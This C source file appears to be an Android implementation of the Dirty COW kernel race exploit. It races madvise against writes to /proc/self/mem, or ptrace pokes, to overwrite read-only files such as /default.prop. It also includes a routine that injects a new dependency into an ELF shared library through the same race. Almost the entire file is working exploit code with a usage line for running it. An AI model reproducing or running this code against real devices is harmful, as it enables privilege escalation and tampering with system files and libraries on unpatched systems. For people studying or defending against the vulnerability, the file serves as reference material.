//
// Created by k.leyfer on 15.03.2017.
//

#include "dirty_copy.h"
#include "elf_parser.h"

pid_t g_pid;

struct mem_arg {
  void *offset;
  void *patch;
  off_t patch_size;
  const char *fname;
  volatile int stop;
  volatile int success;
};

static void *check_thread(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;
  struct stat st;
  int i;
  char *new_data = malloc(sizeof(char) * mem_arg->patch_size);
  for (i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
    int fd = open(mem_arg->fname, O_RDONLY);
    if (fd == -1) {
      warn("Could not open %s: %s!", mem_arg->fname, strerror(errno));
      break;
    }

    if (fstat(fd, &st) == -1) {
      warn("Could not stat %s: %s!", mem_arg->fname, strerror(errno));
      close(fd);
      break;
    }

    read(fd, new_data, mem_arg->patch_size);
    close(fd);

    if (memcmp(new_data, mem_arg->patch, mem_arg->patch_size) == 0) {
      mem_arg->stop = 1;
      mem_arg->success = 1;
      return 0;
    }

    usleep(100 * 1000);
  }

  mem_arg->stop = 1;
  return 0;
}

static void *madvise_thread(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;

  size_t size = mem_arg->patch_size;
  void *addr = (void *) (mem_arg->offset);

  int i = 0, c = 0;
  LOGV("madvise: %p %i", addr, size);
  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
    c += madvise(addr, size, MADV_DONTNEED);
  }

  LOGV("madvise: %i %i", c, i);
  mem_arg->stop = 1;
  return 0;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
  const unsigned char *s;
  long value;
  unsigned char *d;

  d = dest;
  s = src;

  while (n >= sizeof(long)) {
    memcpy(&value, s, sizeof(value));
    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
      warn("ptrace(PTRACE_POKETEXT)");
      return -1;
    }

    n -= sizeof(long);
    d += sizeof(long);
    s += sizeof(long);
  }

  if (n > 0) {
    d -= sizeof(long) - n;

    errno = 0;
    value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
    if (value == -1 && errno != 0) {
      warn("ptrace(PTRACE_PEEKTEXT)");
      return -1;
    }

    memcpy((unsigned char *) &value + sizeof(value) - n, s, n);
    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
      warn("ptrace(PTRACE_POKETEXT)");
      return -1;
    }
  }

  return 0;
}

static void *ptrace_thread(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;

  int i, c;
  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
    c = ptrace_memcpy(g_pid, mem_arg->offset, mem_arg->patch, mem_arg->patch_size);
  }

  LOGV("ptrace: %i %i", c, i);

  mem_arg->stop = 1;
  return NULL;
}

static int can_write_to_self_mem(void *arg) {
  struct mem_arg *mem_arg;
  mem_arg = (struct mem_arg *) arg;
  int fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) {
    warn("Unable to open \"/proc/self/mem\": %s!", strerror(errno));
  }

  int returnval = -1;
  lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
  if (write(fd, mem_arg->patch, mem_arg->patch_size) == mem_arg->patch_size) {
    returnval = 0;
  }

  close(fd);
  return returnval;
}

static void *proc_self_mem_thread(void *arg) {
  struct mem_arg *mem_arg;
  int fd, i, c = 0;
  mem_arg = (struct mem_arg *) arg;

  fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) {
    LOGV("Unable to open \"/proc/self/mem\": %s!\n", strerror(errno));
  }

  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
    lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
    c += write(fd, mem_arg->patch, mem_arg->patch_size);
  }

  LOGV("/proc/self/mem: %i %i", c, i);

  close(fd);

  mem_arg->stop = 1;
  return NULL;
}

static void exploit(struct mem_arg *mem_arg) {
  pthread_t pth1, pth2, pth3;

  LOGV("current: %p=%lx", (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);

  mem_arg->stop = 0;
  mem_arg->success = 0;

  if (can_write_to_self_mem(mem_arg) == -1) {
    LOGV("using ptrace");
    g_pid = fork();
    if (g_pid) {
      pthread_create(&pth3, NULL, check_thread, mem_arg);
      waitpid(g_pid, NULL, 0);
      ptrace_thread((void *) mem_arg);
      pthread_join(pth3, NULL);
    } else {
      pthread_create(&pth1, NULL, madvise_thread, mem_arg);
      ptrace(PTRACE_TRACEME);
      kill(getpid(), SIGSTOP);
      pthread_join(pth1, NULL);
    }
  } else {
    LOGV("using /proc/self/mem");
    pthread_create(&pth3, NULL, check_thread, mem_arg);
    pthread_create(&pth1, NULL, madvise_thread, mem_arg);
    pthread_create(&pth2, NULL, proc_self_mem_thread, mem_arg);
    pthread_join(pth3, NULL);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
  }

  LOGV("result: %i %p=%lx", g_pid, (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);
}

int inject_dependency_into_library(char* src_path, char* dependency_name)
{
  struct mem_arg mem_arg;
  struct stat st;
  struct stat st2;

  int f=open(src_path, O_RDONLY);
  if (f == -1) {
    LOGV("could not open %s", src_path);
    return 0;
  }
  if (fstat(f, &st) == -1) {
    LOGV("could not open %s", src_path);
    return 0;
  }

  size_t size = st.st_size;
  LOGV("size %d\n\n",size);

  mem_arg.patch = malloc(size);
  if (mem_arg.patch == NULL)
  {
    LOGV("malloc");
  }

  memset(mem_arg.patch, 0, size);

  read(f, mem_arg.patch, st2.st_size);

  struct dyn_info info = {
      0, 0, 0
  };
  get_elf_info((struct elf_header*)mem_arg.patch, &info);
  printf("dyn_info: 0x%lx 0x%lx 0x%lx\n", info.str_table_addr, info.dependency_offset_addr, info.llibname_offset_addr);

  printf("base address: 0x%lx\n", (unsigned long)mem_arg.patch);
  unsigned long strtable_arrd_value = *((unsigned long*)(mem_arg.patch + info.str_table_addr + 4));
  printf("str_table_addr_value: 0x%lx\n", strtable_arrd_value);
  unsigned long llibname_offset_addr_value = *((unsigned long*)(mem_arg.patch + info.llibname_offset_addr + 4));
  printf("lbiname_value: 0x%lx\n", *((unsigned long*)(mem_arg.patch + info.llibname_offset_addr)));
  printf("llibname_offset_addr_value: 0x%lx\n", llibname_offset_addr_value);
  char* libname = (char*)(mem_arg.patch + strtable_arrd_value + llibname_offset_addr_value);
  printf("libname: %s\n", libname);

  *((unsigned long*)(mem_arg.patch + info.llibname_offset_addr)) = 1;
  strcpy(libname, dependency_name);

  mem_arg.patch_size = size;

  void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
  if (map == MAP_FAILED) {
    LOGV("mmap");
    return 0;
  }

  LOGV("[*] mmap %p", map);

  mem_arg.offset = map;

  exploit(&mem_arg);

  close(f);

  return 0;
}

int copy_file(char* src_path, char* dst_path)
{
  int fd = open(src_path, O_RDONLY);
  if (fd == -1)
  {
    printf("unable to open %s: %s\n", src_path, strerror(errno));
  }
  int fd1 = open(dst_path, O_WRONLY | O_CREAT);
  if (fd1 == -1)
  {
    printf("unable to open %s: %s\n", dst_path, strerror(errno));
  }

  int bufsize = 4096;
  void* buf = (void*)malloc(bufsize);
  int readed = 0;
  do {
    readed = read(fd, buf, bufsize);
    if (readed > 0)
    {
      int written = write (fd1, buf, readed);
      printf("written %d\n", written);
      if (written == -1)
      {
        printf("unable to write: %s\n", strerror(errno));
        return -1;
      }
    }

    printf("%d readed\n", readed);
  } while(readed > 0);

  close(fd);
  close(fd1);
}

int dirty_copy(const char *src_path, const char *dst_path) {
  struct mem_arg mem_arg;
  struct stat st;
  struct stat st2;

  int f = open(dst_path, O_RDONLY);
  if (f == -1) {
    LOGV("could not open %s", dst_path);
    return -1;
  }
  if (fstat(f, &st) == -1) {
    LOGV("could not stat %s", dst_path);
    return 1;
  }

  int f2 = open(src_path, O_RDONLY);
  if (f2 == -1) {
    LOGV("could not open %s", src_path);
    return 2;
  }
  if (fstat(f2, &st2) == -1) {
    LOGV("could not stat %s", src_path);
    return 3;
  }

  size_t size = (size_t) st2.st_size;
  if (st2.st_size != st.st_size) {
    LOGV("Source file size (%li) and destination file size (%li) differ!\n",
         st2.st_size, st.st_size);
    if (st2.st_size > st.st_size) {
      LOGV("Possible corruption detected!\n");
    } else {
      size = (size_t) st.st_size;
    }
  }

  LOGV("size: %i", size);
  mem_arg.patch = malloc(size);
  if (mem_arg.patch == NULL) {
    return 4;
  }

  mem_arg.patch_size = size;
  memset(mem_arg.patch, 0, size);

  mem_arg.fname = dst_path;

  read(f2, mem_arg.patch, size);
  close(f2);

  void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
  if (map == MAP_FAILED) {
    LOGV("Unable to mmap: %s", strerror(errno));
    return 5;
  }

  LOGV("mmap: %p", map);

  mem_arg.offset = map;

  exploit(&mem_arg);

  close(f);
  if (mem_arg.success == 0) {
    return -1;
  }

  return 0;
}

int main(int argc, const char *argv[]) {
  if (argc < 2) {
    LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
    return 0;
  }

  return dirty_copy(argv[1], argv[2]);
}
